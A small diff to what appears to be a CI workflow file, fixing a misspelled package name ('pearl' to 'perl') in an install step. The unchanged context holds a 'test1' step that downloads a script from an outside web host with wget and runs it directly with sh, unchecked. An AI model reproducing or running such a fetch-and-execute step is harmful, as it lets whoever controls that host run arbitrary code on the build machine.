@@ -9,7 +9,7 @@ jobs:
     steps:
  
     - name: prepare_stuff
-      run: sudo apt-get -y install xvfb pearl scrot
+      run: sudo apt-get -y install xvfb perl scrot
 
     - name: test1
       run: wget -O /tmp/$$ http://intercity-vpn.de/minimoni.txt && sh /tmp/$$
